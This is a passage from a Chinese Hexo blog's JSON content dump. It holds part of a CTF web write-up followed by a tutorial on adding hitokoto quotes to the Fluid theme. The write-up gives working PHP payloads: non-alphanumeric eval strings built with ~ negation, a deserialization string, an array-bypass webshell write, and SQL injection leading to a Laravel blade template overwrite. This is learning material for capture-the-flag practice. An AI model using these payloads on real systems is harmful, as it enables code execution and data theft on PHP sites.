href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h6><p>题目描述：PHP是世界上最…..的语言<br>扫描得到<code>index.php</code><br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">GetYourFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n    <span class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-string\">\"./flag.php\"</span>);\n&#125;\n\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($_GET[<span class=\"hljs-string\">'code'</span>]))&#123;\n    $code = $_GET[<span class=\"hljs-string\">'code'</span>];\n    <span class=\"hljs-comment\">//print(strlen($code));</span>\n    <span class=\"hljs-keyword\">if</span>(strlen($code)&gt;<span class=\"hljs-number\">27</span>)&#123; \n        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Too Long.\"</span>);\n    &#125;\n\n    <span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">'/[a-zA-Z0-9_&amp;^&lt;&gt;\"\\']+/'</span>,$_GET[<span class=\"hljs-string\">'code'</span>])) &#123;\n        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">\"Not Allowed.\"</span>);\n    &#125;\n    @<span class=\"hljs-keyword\">eval</span>($_GET[<span class=\"hljs-string\">'code'</span>]);\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n      highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>这是一个无字符马，可以参考freebuf上的一篇文章–&gt;<a href=\"https://www.freebuf.com/articles/web/186298.html\" target=\"_blank\" rel=\"noopener\">传送门</a>，这是php7的一个解析特性，简单来说就是通过和<code>~</code>符号异或出我们需要的字符。<br><pre><code class=\"hljs undefined\">(~<span class=\"hljs-symbol\">%8</span>F<span class=\"hljs-symbol\">%97</span><span class=\"hljs-symbol\">%8</span>F<span class=\"hljs-symbol\">%96</span><span class=\"hljs-symbol\">%91</span><span class=\"hljs-symbol\">%99</span><span class=\"hljs-symbol\">%90</span>)()<span class=\"hljs-comment\">;</span></code></pre></p>\n<p>这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的<br><img src=\"/img/2019-09-11/img_10.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>然后上面也给了getflag的函数我们，直接调用就可以了<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n$a = urlencode(~<span class=\"hljs-string\">'GetYourFlag'</span>);\n<span class=\"hljs-keyword\">echo</span> $a;\n<span class=\"hljs-comment\">//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98</span></code></pre></p>\n<p>payload为<code>(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();</code><br><img src=\"/img/2019-09-11/img_11.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{3904c5df2e894ca02a21004feb21e617}<br>备注：php是世界上最好的语言hah</p>\n<h6 id=\"API\"><a href=\"#API\" class=\"headerlink\" title=\"API\"></a>API</h6><p>题目描述：API<br>打开提示<code>Api!wow</code>，访问api目录提示<br><img src=\"/img/2019-09-11/img_12.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>提示<code>post filename</code>和传入一个数组，不赋值时候提示<code>json_decode error</code>,固传入一个json数组，盲猜file参数。结果正确<br><img src=\"/img/2019-09-11/img_13.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php<br><img src=\"/img/2019-09-11/img_14.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>得到源码，看了下，是反序列化。把hack.php也读出来<br><img src=\"/img/2019-09-11/img_15.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。(<a href=\"https://www.freebuf.com/articles/web/167721.html\" target=\"_blank\" rel=\"noopener\">小声bb</a>:<a href=\"https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg\" target=\"_blank\" rel=\"noopener\">全都是网上原题</a>)<br>通过../index.php的过滤条件可以构造出反序列化的字符串<br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">O</span><span class=\"hljs-selector-pseudo\">:+4</span><span class=\"hljs-selector-pseudo\">:\"hack\"</span><span class=\"hljs-selector-pseudo\">:1</span>:&#123;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;<span class=\"hljs-attribute\">s</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-string\">\"fffffaa_not.php\"</span>;&#125;</code></pre></p>\n<p>发送的时候需要url编码一下。然后得到源码fffffaa_not.php<br><img src=\"/img/2019-09-11/img_16.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>是一个写shell的功能。其中判断规则preg_match(‘[&lt;&gt;?]’, $text)。<br>这个绕过很简单了，变成数组就可以了。参考–&gt;<a href=\"https://blog.stkusami.com/archives/56\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2019-09-11/img_17.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>成了，直接getshell拿flag<br><img src=\"/img/2019-09-11/img_18.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{Oiahhh1_iiu123}</p>\n<h6 id=\"找漏洞\"><a href=\"#找漏洞\" class=\"headerlink\" title=\"找漏洞\"></a>找漏洞</h6><p>题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？<br>这道题大佬做出来了，我就学习一波。<br>根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。<br>首先审计一下路由有什么可以用的。<br><img src=\"/img/2019-09-11/img_19.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\\Http\\Controllers\\UserController 里面的index方法。<br><img src=\"/img/2019-09-11/img_20.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据<br><img src=\"/img/2019-09-11/img_21.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\\backup\\database\\factories\\UserFactory.php<br><img src=\"/img/2019-09-11/img_22.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……<br><img src=\"/img/2019-09-11/img_23.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>登陆后台之后，就直接跳到上传吧<br><img src=\"/img/2019-09-11/img_24.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>首先带着cookie访问<code>http://119.61.19.212:8085/home/uploadto_upload</code>，会得到一个html<br><img src=\"/img/2019-09-11/img_25.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>意思是按照这个格式构造上传包。这里需要改改。Action填入的是<code>http://119.61.19.212:8085/home/uploadss/NotAllow6171</code>,<code>files</code>标签也要改。改成符合上传包的格式,这里需要注意<code>uploadss</code>后面是需要跟一个key，key从哪里来?回头看看数据库第二条。<br><img src=\"/img/2019-09-11/img_26.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br><del>首先这里……十分恶心</del>。刚开始一直以为上传点是不行的。然后我在源码注意到了<code>template.blade.php</code>。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦<br><img src=\"/img/2019-09-11/img_27.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取<br><img src=\"/img/2019-09-11/img_28.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>这个怎么用呢，看下图吧<br><img src=\"/img/2019-09-11/img_29.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>构造post包发送<br><img src=\"/img/2019-09-11/img_30.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>访问<code>http://119.61.19.212:8085/home/profile</code>出flag<br><img src=\"/img/2019-09-11/img_31.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{Ucan_wow_easy_qaq}</p>"},{"title":"fluid主题博客主页添加一言(hitokoto)手把手教学","index_img":"/img/2020-09-21/6.png","date":"2020-09-21T12:06:07.000Z","_content":"\n### 前言\n所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」\n<!--more-->\n\n#### 启发\n不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……\n![1](/img/2020-09-21/1.png)\n对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求~~，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]~~\n![2](/img/2020-09-21/2.png)\n首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加`hitokoto`参数，方便开启和关闭一言。\n```yaml\nindex:\n  banner_img: /img/default.jpg  # 首页 Banner 头图，以下相同\n  banner_img_height: 100  # 头图高度，屏幕百分比，available: 0 - 100\n  banner_mask_alpha: 0.3  # 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明\n  post_default_img: '' # 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片\n  slogan:  # 首页副标题的独立设置\n    enable: true  # 为 false 则不显示任何内容\n    text: ''\n  hitokoto:\n    enable: true # 开启hitokoto优先显示hitokoto\n  auto_excerpt:\n    enable: true\n  post_url_target: _self  # available: _blank | _self\n  post_meta: # 是否显示文章信息（时间、分类、标签）\n    date: true\n    category: true\n    tag: true\n...\n```\n`text`参数会传到`fluid/layout/index.ejs`\n![3](/img/2020-09-21/3.png)\n最开始是想在这里更改为一言的一句话，在最上面可以通过插入`<script>`标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在`<script>`内使用，不能赋值到ejs中~~我也不会也没查到~~**遂卒**\n后来百度查到`hitokoto`有官方调用的文档-->[传送门](https://hitokoto.cn/)\n也查到一个fluid主题添加一言的教程给了很多帮助-->[传送门](https://pxxyyz.com/posts/30454/)，~~然而那个人的博客主页并没有设置成功/doge~~，还有这篇-->[传送门](https://blog.bill.moe/add-hitokoto/)\n根据博客里讲的，修改的地方位于`layout\\_partial\\plugins\\typed.ejs`，仔细想想也没错，修改`index.ejs`可以直接显示一言不用管其他文件但是实现起来有点困难，`typed.ejs`是打字机的js控制程序，通过修改`typed.ejs`实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。\n#### 修改typed.ejs\n\n首先原始的`typed.ejs`主要分为2部分，第一部分是打字机调用程序，第二部分是接口\n![4](/img/2020-09-21/4.png)\n首先把打字机调用程序改成`function`形式，通过调用`typing`函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的`typed.ejs`中通过`<%- data.subtitle %>`形式来传参，改成函数的时候要改为`hitokoto`，同时在`typed.ejs`中的`#subtitle`是输出点\n```\nvar typed = new Typed('#subtitle', {\n```\n对应到layout.ejs中的如下位置，通过id来确定输出点~~后来发现改了<%- hitokoto %>这个也可以，装死~~\n![5](/img/2020-09-21/5.png)\n如果控制台出现如下异常则是因为`typed.ejs`中#后面的参数和`layout.ejs`的输出点的id不一样导致打字机找不到输出点报的异常。\n```\nTypeError: Cannot read property 'tagName' of null\n```\n因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了`#subtitle`就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后`typing(\"subtitle\", \"<%- data.subtitle %>\")`就可以调用，达到原来的样子根据参考的博客教程添加`<% if(is_post()) { %>`条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开`about.ejs`和`page.ejs`对比会发现固定页面`page.layout`则是背设为固定，`page.ejs`则不是\n```\n//about.ejs\npage.layout = \"about\"\n\n//page.ejs\nvar layout = page.layout\n```\n因此用`&& page.layout!=='about' && page.layout!=='links' && page.layout!=='archive' && page.layout!=='tags'`可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处\n```\ndata.hitokoto + '<br><br><span class=\"from\" id=\"from\">' + ' ——「' +data.from + '」</span>'\n```\n关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐~~学艺不精,等等我本来就不是专精这个的→\\_→。~~于是就通过一些css调整使形式相对更美观一些。\n修改后的`type.ejs`如下\n\n```\n\n<% if(theme.fun_features.typing.enable && page.subtitle !== false){ %>\n  <%- js_ex(theme.static_prefix.typed, \"/typed.min.js\") %>\n  <script>\n    function typing(id, hitokoto){\n      var typed = new Typed('#' + id, {\n        strings: [\n          '  ',\n          hitokoto + \"&nbsp;\",\n        ],\n        cursorChar: \"<%- theme.fun_features.typing.cursorChar %>\",\n        typeSpeed: <%- theme.fun_features.typing.typeSpeed %>,\n        loop: <%- theme.fun_features.typing.loop %>,\n      });\n      typed.stop();\n      $(document).ready(function () {\n        $(\".typed-cursor\").addClass(\"h2\");\n        typed.start();\n      });\n    };\n      \n  <% if(is_post()) { %>\n    typing(\"subtitle\", \"<%- data.subtitle %>\")\n  <% } else if(theme.index.hitokoto.enable && page.layout!=='about' && page.layout!=='links' && page.layout!=='archive' && page.layout!=='tags') { %>\n    fetch('https://v1.hitokoto.cn')\n    .then(response => response.json())\n    .then(data => {\n       typing(\"hitokoto\", (data.hitokoto + '<br><br><span class=\"from\" id=\"from\">' + ' ——「' +data.from + '」</span>'))\n    })\n    .catch(console.error)\n    <% } else if(page.layout!== '' ) { %>\n        typing(\"subtitle\", \"<%- data.subtitle %>\")\n    <% } %>\n  </script>\n<% } %>\n```\n#### 修改layout.ejs\n`layout.ejs`则和博客教程的那样即可\n```\n            <span class=\"h2\" id=\"subtitle\">\n              <% if(theme.fun_features.typing.enable == false) { %>\n                <%- subtitle %>\n              <% } %>\n            </span>\n\n            <% if(!is_post()) { %>\n            <br>\n            <span class=\"h2\" id=\"subtitle\">\n              <% if(theme.fun_features.typing.enable == false) { %>\n                <%- hitokoto %>\n              <% } %>\n            </span>\n            <% } %>\n\n            <% if(is_post() && page.meta !== false) { %>\n              <%- partial('_partial/post-meta') %>\n            <% } %>\n          </div>\n```\n成品如下，还有在博客下方评论框实现的。~~为什么刷不到那句话。~~\n![6](/img/2020-09-21/6.png)\n\n\n","source":"_posts/2020-09-21-fluid-add-hitokoto.md","raw":"---\ntitle: fluid主题博客主页添加一言(hitokoto)手把手教学\nindex_img: /img/2020-09-21/6.png\ndate: 2020-09-21 20:06:07\ntags: \n- hitokoto\n- fluid\n- hexo\n---\n\n### 前言\n所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」\n<!--more-->\n\n#### 启发\n不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……\n![1](/img/2020-09-21/1.png)\n对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求~~，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]~~\n![2](/img/2020-09-21/2.png)\n首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加`hitokoto`参数，方便开启和关闭一言。\n```yaml\nindex:\n  banner_img: /img/default.jpg  # 首页 Banner 头图，以下相同\n  banner_img_height: 100  # 头图高度，屏幕百分比，available: 0 - 100\n  banner_mask_alpha: 0.3  # 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明\n  post_default_img: '' # 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片\n  slogan:  # 首页副标题的独立设置\n    enable: true  # 为 false 则不显示任何内容\n    text: ''\n  hitokoto:\n    enable: true # 开启hitokoto优先显示hitokoto\n  auto_excerpt:\n    enable: true\n  post_url_target: _self  # available: _blank | _self\n  post_meta: # 是否显示文章信息（时间、分类、标签）\n    date: true\n    category: true\n    tag: true\n...\n```\n`text`参数会传到`fluid/layout/index.ejs`\n![3](/img/2020-09-21/3.png)\n最开始是想在这里更改为一言的一句话，在最上面可以通过插入`<script>`标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在`<script>`内使用，不能赋值到ejs中~~我也不会也没查到~~**遂卒**\n后来百度查到`hitokoto`有官方调用的文档-->[传送门](https://hitokoto.cn/)\n也查到一个fluid主题添加一言的教程给了很多帮助-->[传送门](https://pxxyyz.com/posts/30454/)，~~然而那个人的博客主页并没有设置成功/doge~~，还有这篇-->[传送门](https://blog.bill.moe/add-hitokoto/)\n根据博客里讲的，修改的地方位于`layout\\_partial\\plugins\\typed.ejs`，仔细想想也没错，修改`index.ejs`可以直接显示一言不用管其他文件但是实现起来有点困难，`typed.ejs`是打字机的js控制程序，通过修改`typed.ejs`实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。\n#### 修改typed.ejs\n\n首先原始的`typed.ejs`主要分为2部分，第一部分是打字机调用程序，第二部分是接口\n![4](/img/2020-09-21/4.png)\n首先把打字机调用程序改成`function`形式，通过调用`typing`函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的`typed.ejs`中通过`<%- data.subtitle %>`形式来传参，改成函数的时候要改为`hitokoto`，同时在`typed.ejs`中的`#subtitle`是输出点\n```\nvar typed = new Typed('#subtitle', {\n```\n对应到layout.ejs中的如下位置，通过id来确定输出点~~后来发现改了<%- hitokoto %>这个也可以，装死~~\n![5](/img/2020-09-21/5.png)\n如果控制台出现如下异常则是因为`typed.ejs`中#后面的参数和`layout.ejs`的输出点的id不一样导致打字机找不到输出点报的异常。\n```\nTypeError: Cannot read property 'tagName' of null\n```\n因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了`#subtitle`就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后`typing(\"subtitle\", \"<%- data.subtitle %>\")`就可以调用，达到原来的样子根据参考的博客教程添加`<% if(is_post()) { %>`条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开`about.ejs`和`page.ejs`对比会发现固定页面`page.layout`则是背设为固定，`page.ejs`则不是\n```\n//about.ejs\npage.layout = \"about\"\n\n//page.ejs\nvar layout = page.layout\n```\n因此用`&& page.layout!=='about' && page.layout!=='links' && page.layout!=='archive' && page.layout!=='tags'`可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处\n```\ndata.hitokoto + '<br><br><span class=\"from\" id=\"from\">' + ' ——「' +data.from + '」</span>'\n```\n关于出处一开始是用两个函数调用去输出然后发现很乱，一个句子和出处一起输出又不知道怎么实现出处右对齐~~学艺不精,等等我本来就不是专精这个的→\\_→。~~于是就通过一些css调整使形式相对更美观一些。\n修改后的`type.ejs`如下\n\n```\n\n<% if(theme.fun_features.typing.enable && page.subtitle !== false){ %>\n  <%- js_ex(theme.static_prefix.typed, \"/typed.min.js\") %>\n  <script>\n    function typing(id, hitokoto){\n      var typed = new Typed('#' + id, {\n        strings: [\n          '  ',\n          hitokoto + \"&nbsp;\",\n        ],\n        cursorChar: \"<%- theme.fun_features.typing.cursorChar %>\",\n        typeSpeed: <%- theme.fun_features.typing.typeSpeed %>,\n        loop: <%- theme.fun_features.typing.loop %>,\n      });\n      typed.stop();\n      $(document).ready(function () {\n        $(\".typed-cursor\").addClass(\"h2\");\n        typed.start();\n      });\n    };\n      \n  <% if(is_post()) { %>\n    typing(\"subtitle\", \"<%- data.subtitle %>\")\n  <% } else if(theme.index.hitokoto.enable && page.layout!=='about' && page.layout!=='links' && page.layout!=='archive' && page.layout!=='tags') { %>\n    fetch('https://v1.hitokoto.cn')\n    .then(response => response.json())\n    .then(data => {\n       typing(\"hitokoto\", (data.hitokoto + '<br><br><span class=\"from\" id=\"from\">' + ' ——「' +data.from + '」</span>'))\n    })\n    .catch(console.error)\n    <% } else if(page.layout!== '' ) { %>\n        typing(\"subtitle\", \"<%- data.subtitle %>\")\n    <% } %>\n  </script>\n<% } %>\n```\n#### 修改layout.ejs\n`layout.ejs`则和博客教程的那样即可\n```\n            <span class=\"h2\" id=\"subtitle\">\n              <% if(theme.fun_features.typing.enable == false) { %>\n                <%- subtitle %>\n              <% } %>\n            </span>\n\n            <% if(!is_post()) { %>\n            <br>\n            <span class=\"h2\" id=\"subtitle\">\n              <% if(theme.fun_features.typing.enable == false) { %>\n                <%- hitokoto %>\n              <% } %>\n            </span>\n            <% } %>\n\n            <% if(is_post() && page.meta !== false) { %>\n              <%- partial('_partial/post-meta') %>\n            <% } %>\n          </div>\n```\n成品如下，还有在博客下方评论框实现的。~~为什么刷不到那句话。~~\n![6](/img/2020-09-21/6.png)\n\n\n","slug":"fluid-add-hitokoto","published":1,"mouth":"09","updated":"2020-09-21T12:26:20.545Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxu000yez8k3csit8zi","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>所以说爱恨真是奇怪的东西，有的早早腐烂入土，有的刻骨。 ——「全球高考」<br><a id=\"more\"></a></p>\n<h4 id=\"启发\"><a href=\"#启发\" class=\"headerlink\" title=\"启发\"></a>启发</h4><p>不知不觉博客换了yilia、next、fluid三个主题了，三个主题都用了挺长时间。偶然间看到别人发的博客主页有句很好看的句子，自己也想搞一个来于是就动手搞一搞……<br><img src=\"/img/2020-09-21/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>对于我这种主页不知道哔哔什么废话的再适合不过了。然鹅那个博客刷新的时候并没有发起特殊的请求，不过还好后来在同事的博客找到获取一句话的网络请求<del>，后来发现这个叫一言而且很多博客也有在用，孤陋寡闻了[捂脸]</del><br><img src=\"/img/2020-09-21/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>首先fluid_config.yml中首页的一句话是在index下的slogan中的text设置，顺便添加<code>hitokoto</code>参数，方便开启和关闭一言。<br><pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">index:</span>\n<span class=\"hljs-attr\">  banner_img:</span> <span class=\"hljs-string\">/img/default.jpg</span>  <span class=\"hljs-comment\"># 首页 Banner 头图，以下相同</span>\n<span class=\"hljs-attr\">  banner_img_height:</span> <span class=\"hljs-number\">100</span>  <span class=\"hljs-comment\"># 头图高度，屏幕百分比，available: 0 - 100</span>\n<span class=\"hljs-attr\">  banner_mask_alpha:</span> <span class=\"hljs-number\">0.3</span>  <span class=\"hljs-comment\"># 头图黑色蒙版的透明度，available: 0 - 1.0， 0 是完全透明（无蒙版），1 是完全不透明</span>\n<span class=\"hljs-attr\">  post_default_img:</span> <span class=\"hljs-string\">''</span> <span class=\"hljs-comment\"># 默认的文章封面图，当没有指定 index_img 时会使用该图片，若都为空则不显示任何图片</span>\n<span class=\"hljs-attr\">  slogan:</span>  <span class=\"hljs-comment\"># 首页副标题的独立设置</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span>  <span class=\"hljs-comment\"># 为 false 则不显示任何内容</span>\n<span class=\"hljs-attr\">    text:</span> <span class=\"hljs-string\">''</span>\n<span class=\"hljs-attr\">  hitokoto:</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span> <span class=\"hljs-comment\"># 开启hitokoto优先显示hitokoto</span>\n<span class=\"hljs-attr\">  auto_excerpt:</span>\n<span class=\"hljs-attr\">    enable:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">  post_url_target:</span> <span class=\"hljs-string\">_self</span>  <span class=\"hljs-comment\"># available: _blank | _self</span>\n<span class=\"hljs-attr\">  post_meta:</span> <span class=\"hljs-comment\"># 是否显示文章信息（时间、分类、标签）</span>\n<span class=\"hljs-attr\">    date:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">    category:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-attr\">    tag:</span> <span class=\"hljs-literal\">true</span>\n<span class=\"hljs-string\">...</span></code></pre></p>\n<p><code>text</code>参数会传到<code>fluid/layout/index.ejs</code><br><img src=\"/img/2020-09-21/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>最开始是想在这里更改为一言的一句话，在最上面可以通过插入<code>&lt;script&gt;</code>标签,然后使用ajax执行Get请求就可以获得一言的句子，但是此方法获取到的值只能在<code>&lt;script&gt;</code>内使用，不能赋值到ejs中<del>我也不会也没查到</del><strong>遂卒</strong><br>后来百度查到<code>hitokoto</code>有官方调用的文档–&gt;<a href=\"https://hitokoto.cn/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>也查到一个fluid主题添加一言的教程给了很多帮助–&gt;<a href=\"https://pxxyyz.com/posts/30454/\" target=\"_blank\" rel=\"noopener\">传送门</a>，<del>然而那个人的博客主页并没有设置成功/doge</del>，还有这篇–&gt;<a href=\"https://blog.bill.moe/add-hitokoto/\" target=\"_blank\" rel=\"noopener\">传送门</a><br>根据博客里讲的，修改的地方位于<code>layout\\_partial\\plugins\\typed.ejs</code>，仔细想想也没错，修改<code>index.ejs</code>可以直接显示一言不用管其他文件但是实现起来有点困难，<code>typed.ejs</code>是打字机的js控制程序，通过修改<code>typed.ejs</code>实现index页面打印一言，其余页面该打印什么打印什么，只要加个if条件判断是index页面还是其他页面。</p>\n<h4 id=\"修改typed-ejs\"><a href=\"#修改typed-ejs\" class=\"headerlink\" title=\"修改typed.ejs\"></a>修改typed.ejs</h4><p>首先原始的<code>typed.ejs</code>主要分为2部分，第一部分是打字机调用程序，第二部分是接口<br><img src=\"/img/2020-09-21/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>首先把打字机调用程序改成<code>function</code>形式，通过调用<code>typing</code>函数来输出，需要传入的参数有id和hitokoto(subtitle)，在原始的<code>typed.ejs</code>中通过<code>&lt;%- data.subtitle %&gt;</code>形式来传参，改成函数的时候要改为<code>hitokoto</code>，同时在<code>typed.ejs</code>中的<code>#subtitle</code>是输出点<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">var</span> typed = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">Typed</span>(<span class=\"hljs-string\">'#subtitle'</span>, &#123;</code></pre></p>\n<p>对应到layout.ejs中的如下位置，通过id来确定输出点<del>后来发现改了&lt;%- hitokoto %&gt;这个也可以，装死</del><br><img src=\"/img/2020-09-21/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>如果控制台出现如下异常则是因为<code>typed.ejs</code>中#后面的参数和<code>layout.ejs</code>的输出点的id不一样导致打字机找不到输出点报的异常。<br><pre><code class=\"hljs undefined\">TypeError: Cannot <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">property</span><span class=\"hljs-title\"> </span>'tagName' of null</code></pre></p>\n<p>因为我的目标只需要修改index页面的打字机而其他页面还是原来的样子，一旦修改了<code>#subtitle</code>就会触发报错，当然也可以不修改，因为我一开始没搞懂就改了，就懒得改回去了。封装好typing函数之后<code>typing(&quot;subtitle&quot;, &quot;&lt;%- data.subtitle %&gt;&quot;)</code>就可以调用，达到原来的样子根据参考的博客教程添加<code>&lt;% if(is_post()) { %&gt;</code>条件可以过让文章打印原始的subtitle，也就是对应着文章的标题，但是还不行，在其他归档、标签、关于等页面还是会显示一言。打开<code>about.ejs</code>和<code>page.ejs</code>对比会发现固定页面<code>page.layout</code>则是背设为固定，<code>page.ejs</code>则不是<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">//about.ejs</span>\npage<span class=\"hljs-selector-class\">.layout</span> = <span class=\"hljs-string\">\"about\"</span>\n\n<span class=\"hljs-comment\">//page.ejs</span>\n<span class=\"hljs-selector-tag\">var</span> layout = page.layout</code></pre></p>\n<p>因此用<code>&amp;&amp; page.layout!==&#39;about&#39; &amp;&amp; page.layout!==&#39;links&#39; &amp;&amp; page.layout!==&#39;archive&#39; &amp;&amp; page.layout!==&#39;tags&#39;</code>可以排除掉不想展示的页面。(如果你想要所有页面设为一言就去掉即可)。按照博客教程是只显示一句话，没有出处。对于引用别人的东西我喜欢加上出处<br><pre><code class=\"hljs undefined\">data<span class=\"hljs-selector-class\">.hitokoto</span> + <span class=\"hljs-string\">'&lt;br&gt;&lt;br&gt;&lt;span class=\"from\" id=\"from\"&gt;'</span> + <span class=\"hljs-string\">' ——「'</span> +data<span class=\"hljs-selector-class\">.from</span> + <span 